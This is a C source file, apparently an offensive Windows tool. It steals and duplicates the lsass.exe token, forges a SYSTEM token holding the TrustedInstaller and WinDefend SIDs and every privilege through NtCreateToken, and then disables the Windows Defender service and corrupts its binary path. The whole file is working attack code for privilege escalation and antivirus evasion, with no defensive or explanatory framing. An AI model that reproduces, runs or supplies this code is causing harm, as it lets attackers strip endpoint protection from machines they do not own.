//Create new token with NT SERVICE\TrustedInstaller and NT SERVICE\Windefend SID and change configuration of WinDefend service
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <sddl.h>


#define PRIVCOUNT 35
#define GROUPCOUNT 6
const wchar_t* privs[] = { L"SeCreateTokenPrivilege",L"SeAssignPrimaryTokenPrivilege",L"SeLockMemoryPrivilege",L"SeIncreaseQuotaPrivilege",L"SeMachineAccountPrivilege",L"SeTcbPrivilege",L"SeSecurityPrivilege",L"SeTakeOwnershipPrivilege",L"SeLoadDriverPrivilege",L"SeSystemProfilePrivilege",L"SeSystemtimePrivilege",L"SeProfileSingleProcessPrivilege",L"SeIncreaseBasePriorityPrivilege",L"SeCreatePagefilePrivilege",L"SeCreatePermanentPrivilege",L"SeBackupPrivilege",L"SeRestorePrivilege",L"SeShutdownPrivilege",L"SeDebugPrivilege",L"SeAuditPrivilege",L"SeSystemEnvironmentPrivilege",L"SeChangeNotifyPrivilege",L"SeRemoteShutdownPrivilege",L"SeUndockPrivilege",L"SeSyncAgentPrivilege",L"SeEnableDelegationPrivilege",L"SeManageVolumePrivilege",L"SeImpersonatePrivilege",L"SeCreateGlobalPrivilege",L"SeTrustedCredManAccessPrivilege",L"SeRelabelPrivilege",L"SeIncreaseWorkingSetPrivilege",L"SeTimeZonePrivilege",L"SeCreateSymbolicLinkPrivilege",L"SeDelegateSessionUserImpersonatePrivilege" };
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateToken)(OUT PHANDLE TokenHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES   ObjectAttributes, IN TOKEN_TYPE           TokenType, IN PLUID AuthenticationId, IN PLARGE_INTEGER       ExpirationTime, IN PTOKEN_USER          TokenUser, IN PTOKEN_GROUPS        TokenGroups, IN PTOKEN_PRIVILEGES    TokenPrivileges, IN PTOKEN_OWNER         TokenOwner, IN PTOKEN_PRIMARY_GROUP TokenPrimaryGroup, IN PTOKEN_DEFAULT_DACL  TokenDefaultDacl, IN PTOKEN_SOURCE        TokenSource);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateLocallyUniqueId)(OUT PLUID LocallyUniqueId);

LUID LookupPriv(const wchar_t* priv) {
    LUID luid;
    if (LookupPrivilegeValueW(NULL, priv, &luid)) {
        return luid;
    }

}
DWORD FindProc(const wchar_t* process) {
    HANDLE snap;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32First(snap, &pe32)) {
            do {
                if (wcscmp(pe32.szExeFile, process) == 0) {
                    return pe32.th32ProcessID;
                }

            } while (Process32Next(snap, &pe32));
        }
    }
}
HANDLE GetToken(DWORD pid) {
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;
 

    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
    if (hProcess != NULL) {
        if (OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken)) {
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                return hDupToken;
            }


        }

    }
}

HANDLE  CreateToken() {
    HMODULE ntdll;

    LUID luid;
    HANDLE token = NULL;

    TOKEN_USER tokenuser;
    TOKEN_OWNER tokenowner;
    TOKEN_PRIMARY_GROUP tokenpgroup;

    PTOKEN_GROUPS tokengroup = NULL;
    PTOKEN_PRIVILEGES tokenpriv = NULL;
    PTOKEN_DEFAULT_DACL tokendacl = NULL;
    PTOKEN_SOURCE tokensource = NULL;
    PSID pSYSTEMSID = NULL;
    PSID pAUTH = NULL;
    PSID pLOCALADM = NULL;
    PSID pEVERYONE = NULL;
    PSID pSYS = NULL;
    PSID pTrusted = NULL;
    PSID pWindefend = NULL;
    CHAR source[] = "seclogon";
    LARGE_INTEGER exp;
    LUID lluid = SYSTEM_LUID;
    NTSTATUS status;
    exp.QuadPart = -1;
   

    ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll == NULL) {
        exit(1);
    }
    _NtCreateToken NtCreateToken = (_NtCreateToken)GetProcAddress(ntdll, "NtCreateToken");
    _NtAllocateLocallyUniqueId NtAllocateLocallyUniqueId = (_NtAllocateLocallyUniqueId)GetProcAddress(ntdll, "NtAllocateLocallyUniqueId");

    SECURITY_QUALITY_OF_SERVICE sqs = { sizeof(sqs),SecurityAnonymous,SECURITY_STATIC_TRACKING,FALSE };
    OBJECT_ATTRIBUTES oa = { sizeof(oa),NULL,NULL,0,NULL,&sqs };




    if (NtCreateToken == NULL || NtAllocateLocallyUniqueId == NULL) {
        exit(1);
    }
    NtAllocateLocallyUniqueId(&luid);

    // Create SID's 

    if (!ConvertStringSidToSidW(L"S-1-5-18", &pSYSTEMSID)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-5-32-544", &pLOCALADM)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!ConvertStringSidToSidW(L"S-1-5-11", &pAUTH)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-1-0", &pEVERYONE)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-16-16384", &pSYS)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &pTrusted)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-5-80-1913148863-3492339771-4165695881-2087618961-4109116736", &pWindefend)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }




    //Set user 
    tokenuser.User.Sid = pSYSTEMSID;
    tokenuser.User.Attributes = 0;

    // Set groups
    tokengroup = (PTOKEN_GROUPS)GlobalAlloc(GPTR, sizeof(TOKEN_GROUPS) + (sizeof(SID_AND_ATTRIBUTES) * GROUPCOUNT));
    if (tokengroup == NULL) {
        goto cleanup;
    }
    tokengroup->GroupCount = GROUPCOUNT;
    tokengroup->Groups[0].Sid = pLOCALADM;
    tokengroup->Groups[0].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY | SE_GROUP_OWNER;
    tokengroup->Groups[1].Sid = pAUTH;
    tokengroup->Groups[1].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    tokengroup->Groups[2].Sid = pEVERYONE;
    tokengroup->Groups[2].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    tokengroup->Groups[3].Sid = pSYS;
    tokengroup->Groups[3].Attributes = SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED;
    tokengroup->Groups[4].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT| SE_GROUP_OWNER;
    tokengroup->Groups[4].Sid = pTrusted;
    tokengroup->Groups[5].Sid = pWindefend;
    tokengroup->Groups[5].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT| SE_GROUP_OWNER;

    // Add privileges
    tokenpriv = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, sizeof(PTOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * PRIVCOUNT));
    if (tokenpriv == NULL) {
        goto cleanup;
    }
    tokenpriv->PrivilegeCount = PRIVCOUNT;

    for (int i = 0; i < tokenpriv->PrivilegeCount; i++) {

        tokenpriv->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
        tokenpriv->Privileges[i].Luid = LookupPriv(privs[i]);
    }

    tokenowner.Owner = pLOCALADM;
    tokenpgroup.PrimaryGroup = pLOCALADM;
    tokendacl = (PTOKEN_DEFAULT_DACL)GlobalAlloc(GPTR, sizeof(PTOKEN_DEFAULT_DACL));

    tokensource = (PTOKEN_SOURCE)GlobalAlloc(GPTR, sizeof(TOKEN_SOURCE));
    if (tokensource == NULL) {
        goto cleanup;
    }
    tokensource->SourceIdentifier = luid;
    memcpy(tokensource->SourceName, source, 8);

    status = NtCreateToken(&token, TOKEN_ALL_ACCESS, &oa, TokenPrimary, &lluid, &exp, &tokenuser, tokengroup, tokenpriv, &tokenowner, &tokenpgroup, tokendacl, tokensource);
    if (status != 0) {
        printf("Error: %d\n", status);
        goto cleanup;
    }
    return token;

cleanup:
    if(pSYSTEMSID != NULL)
    {
        LocalFree(pSYSTEMSID);
    }
    if (pAUTH != NULL)
    {
        LocalFree(pAUTH);
    }
    if (pEVERYONE != NULL)
    {
        LocalFree(pEVERYONE);
    }
    if (pSYS != NULL)
    {
        LocalFree(pSYS);
    }
    if (pTrusted != NULL)
    {
        LocalFree(pTrusted);
    }
    if (pWindefend != NULL)
    {
        LocalFree(pWindefend);
    }
    if (tokendacl != NULL) {
        GlobalFree(tokendacl);
    }
    if (tokensource != NULL) {
        GlobalFree(tokensource);
    }
    if (tokenpriv != NULL) {
        GlobalFree(tokenpriv);
    }
    if (tokengroup != NULL) {
        GlobalFree(tokengroup);
    }
    exit(1);
}
void DisableDefender() {
    SC_HANDLE scm;
    SC_HANDLE service;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        printf("Error[OpenSCManager]: %d\n", GetLastError());
        exit(1);
    }
    service = OpenService(scm, L"windefend", GENERIC_WRITE);
    if (service == NULL) {
        printf("Error[OpenService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        exit(1);
    }
    if (!ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, L"C:\\blah", NULL, NULL, NULL, NULL, NULL, NULL)) {
        printf("Error[ChangeServiceConfig]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        exit(1);
    }
    printf("Service configuration changed!\n");
    
    
    CloseServiceHandle(scm);
    CloseServiceHandle(service);
}

int wmain()
{

    HANDLE token = NULL;
    HANDLE newToken = NULL;
    token = GetToken(FindProc(L"lsass.exe"));
    if (token != NULL) {
       
        if (ImpersonateLoggedOnUser(token)) { 
            newToken = CreateToken();
            if (token != NULL) {}
            RevertToSelf();
            if (ImpersonateLoggedOnUser(newToken)) {
                DisableDefender();
            }
        }
    }
}
